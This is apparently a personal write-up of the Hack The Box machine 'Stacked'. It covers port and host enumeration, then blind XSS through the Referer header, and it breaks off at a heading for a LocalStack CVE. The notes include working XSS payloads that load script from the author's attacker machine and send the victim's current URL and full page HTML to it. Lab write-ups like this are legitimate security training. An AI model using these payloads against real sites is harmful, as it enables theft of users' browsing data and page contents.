---
title: htb stacked
author: Yuchao
date: 2022-03-29 11:33:00 +0800
categories: [sec]
tags: [htb, aws, localstack]
math: true
mermaid: true
---

## recon

#### nmap
```
nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.112
nmap -p 22,80,2376 -sCV -oA scans/nmap-tcpscripts 10.10.11.112
```
- 22/tcp   open  ssh; 80/tcp   open  http; 2376/tcp open  docker

#### feroxbuster, directory discovery
``` feroxbuster -u http://stacked.htb ```

#### wfuzz, host discovery
``` wfuzz -H "Host: FUZZ.stacked.htb" -u http://stacked.htb -w /usr/seclists/Discovery/DNS/subdomains-top1million-20000.txt --hw 26```
- hide word length 26 responses
- find host: portfolio.stacked.htb - TCP 80
- a local stack development page.
- <https://github.com/localstack/localstack>
- serverless: run services often used for Serverless apps (iam, lambda, dynamodb, apigateway, s3, sns)

## XSS

#### recon for XSS
- input area, and interesting headers.
- add payload as ``` <img src="http://{attackerIP}/fieldname_or_header_name"> ``` in different places.
- send the request.
attacker machine
``` sudo python3 -m http.server 80 ```
- 80 as we did not specify port in set payload
- wait a while
- ``` "GET /referer HTTP/1.1" 404 - ```
- so the ONLY field vulnerable to XSS is: Header -> referer.
- - run ``` date ``` two times, culculate the XSS victim(background cron) activity interval.
- interesting material below.
- <https://www.horizon3.ai/unauthenticated-xss-to-remote-code-execution-chain-in-mautic-3-2-4/>

#### find out what the URL the victim is looking at.

Method 1:
```javascript 
<script src="http://10.10.14.6/xss.js"></script> 
```
- in the victim`s referer, we can see the response is from: "/read-mail.php?id=5"

Method 2(Better):
```javascript
var exfilreq = new XMLHttpRequest();    
exfilreq.open("GET", "http://{attackerIP}/" + document.location, false);    
exfilreq.send(); 
```
- set above script as payload
- when we nc at 80, can see the victim`s current page appended.
- "GET /http://mail.stacked.htb/read-mail.php?id=2 HTTP/1.1"
- For victim will visit "http://{attackerIP}/http://mail.stacked.htb/read-mail.php?id=2"

We can even see content the victim is browsing by
```javascript
var exfilreq = new XMLHttpRequest();    
exfilreq.open("POST", "http://{attackerIP}:9001/", false);    
exfilreq.send(document.documentElement.outerHTML); 
```


## LocalStack vulnerability

#### CVE-2021-32090 
